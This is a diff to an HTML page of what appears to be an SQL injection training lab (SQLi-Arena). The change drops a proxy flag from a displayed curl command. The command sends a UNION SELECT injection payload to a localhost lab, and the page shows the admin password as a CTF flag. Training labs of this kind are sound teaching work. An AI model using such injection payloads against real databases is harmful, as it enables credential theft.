@@ -78,7 +78,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mariadb/lab1" \<br> --data-urlencode "id=' UNION SELECT username, password, email FROM users WHERE username='admin' -- "<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mariadb/lab1" \<br> --data-urlencode "id=' UNION SELECT username, password, email FROM users WHERE username='admin' -- "<br><br>
         <span class="prompt">Result: </span><strong>Username:</strong> admin &nbsp;&bull;&nbsp; <strong>Password:</strong> FLAG{ma_un10n_mysql_c0mp4t} &nbsp;&bull;&nbsp; <strong>Email:</strong> admin@sqli-arena.local
     </div>
 </div>
